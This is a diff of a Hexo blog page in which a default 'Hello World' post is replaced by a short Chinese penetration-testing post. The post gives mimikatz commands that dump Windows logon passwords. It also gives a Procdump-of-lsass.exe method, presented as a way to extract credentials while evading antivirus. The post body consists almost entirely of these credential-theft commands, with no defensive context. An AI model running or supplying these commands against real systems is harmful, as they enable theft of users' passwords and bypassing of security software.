@@ -7,7 +7,7 @@
     
 
     <title>
-      Hello World | Noaccess 
+      minikatz | Noaccess 
     </title>
 
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -16,17 +16,20 @@
     
     
 
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="基本使用1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &amp;gt;&amp;gt; log.txt minikatz具有绕过杀软dump用户密码的能力 绕过杀软">
+<meta name="keywords" content="零碎知识,渗透">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World | Noaccess">
-<meta property="og:url" content="http://hxcc.github.io/2018/01/24/hello-world/index.html">
+<meta property="og:title" content="minikatz | Noaccess">
+<meta property="og:url" content="http://hxcc.github.io/2016/12/28/minikatz绕过杀软/index.html">
 <meta property="og:site_name" content="Noaccess">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="基本使用1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &amp;gt;&amp;gt; log.txt minikatz具有绕过杀软dump用户密码的能力 绕过杀软">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-01-24T04:43:06.029Z">
+<meta property="og:image" content="http://i.imgur.com/2fcSgTg.png">
+<meta property="og:updated_time" content="2017-12-22T09:39:47.804Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World | Noaccess">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="minikatz | Noaccess">
+<meta name="twitter:description" content="基本使用1C:\&amp;gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &amp;gt;&amp;gt; log.txt minikatz具有绕过杀软dump用户密码的能力 绕过杀软">
+<meta name="twitter:image" content="http://i.imgur.com/2fcSgTg.png">
     
     
     
@@ -155,17 +158,22 @@ classes that you can use:
 
   <header class="post-header">
     
-    <h1 class="post-title">Hello World</h1>
+    <h1 class="post-title">minikatz</h1>
 
     
 
     <div class="post-meta">
-      <time datetime="2018-01-24" class="post-meta__date date">2018-01-24</time> 
+      <time datetime="2016-12-28" class="post-meta__date date">2016-12-28</time> 
 
       <span class="post-meta__tags tags">
 
           
 
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/渗透/">渗透</a>, <a class="tags-link" href="/tags/零碎知识/">零碎知识</a>
+            </font>
           
 
       </span>
@@ -176,15 +184,12 @@ classes that you can use:
   </header>
 
   <section id="post-content" class="article-content post">
-    <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+    <h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span> &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>
+<p>minikatz具有绕过杀软dump用户密码的能力</p>
+<h3 id="绕过杀软"><a href="#绕过杀软" class="headerlink" title="绕过杀软"></a>绕过杀软</h3><a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">log</span></span><br><span class="line">$ Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">$ sekurlsa::minidump lsass.dmp</span><br><span class="line">$ sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+<h3 id="procdump兼容性如下"><a href="#procdump兼容性如下" class="headerlink" title="procdump兼容性如下"></a>procdump兼容性如下</h3><p><img src="http://i.imgur.com/2fcSgTg.png" alt=""></p>
+<p><span id="busuanzi_container_page_pv"><br>  本文总阅读量<span id="busuanzi_value_page_pv"></span>次<br></span></p>
 
   </section>
 
@@ -239,6 +244,10 @@ classes that you can use:
 
     
     
+
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+
     <!--kill ie6 -->
 <!--[if IE 6]>
   <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
